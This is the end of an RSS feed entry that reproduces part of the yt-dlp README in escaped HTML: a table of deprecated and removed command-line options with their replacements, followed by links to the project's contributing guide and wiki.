--include-ads                    No longer supported
--no-include-ads                 Default
--write-annotations              No supported site has annotations now
--no-write-annotations           Default
--avconv-location                Removed alias for --ffmpeg-location
--cn-verification-proxy URL      Removed alias for --geo-verification-proxy URL
--dump-headers                   Removed alias for --print-traffic
--dump-intermediate-pages        Removed alias for --dump-pages
--youtube-skip-dash-manifest     Removed alias for --extractor-args "youtube:skip=dash" (Alias: --no-youtube-include-dash-manifest)
--youtube-skip-hls-manifest      Removed alias for --extractor-args "youtube:skip=hls" (Alias: --no-youtube-include-hls-manifest)
--youtube-include-dash-manifest  Default (Alias: --no-youtube-skip-dash-manifest)
--youtube-include-hls-manifest   Default (Alias: --no-youtube-skip-hls-manifest)
--youtube-print-sig-code         Removed testing functionality
--dump-user-agent                No longer supported
--xattr-set-filesize             No longer supported
--compat-options seperate-video-versions  No longer needed
--compat-options no-youtube-prefer-utc-upload-date  No longer supported
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;Removed&lt;/h4&gt; 
&lt;p&gt;These options were deprecated since 2014 and have now been entirely removed&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;-A, --auto-number                -o "%(autonumber)s-%(id)s.%(ext)s"
-t, -l, --title, --literal       -o "%(title)s-%(id)s.%(ext)s"
&lt;/code&gt;&lt;/pre&gt; 
&lt;h1&gt;CONTRIBUTING&lt;/h1&gt; 
&lt;p&gt;See &lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/CONTRIBUTING.md#contributing-to-yt-dlp"&gt;CONTRIBUTING.md&lt;/a&gt; for instructions on &lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/CONTRIBUTING.md#opening-an-issue"&gt;Opening an Issue&lt;/a&gt; and &lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/CONTRIBUTING.md#developer-instructions"&gt;Contributing code to the project&lt;/a&gt;&lt;/p&gt; 
&lt;h1&gt;WIKI&lt;/h1&gt; 
&lt;p&gt;See the &lt;a href="https://github.com/yt-dlp/yt-dlp/wiki"&gt;Wiki&lt;/a&gt; for more information&lt;/p&gt;</description>
    </item>
    
  </channel>
</rss>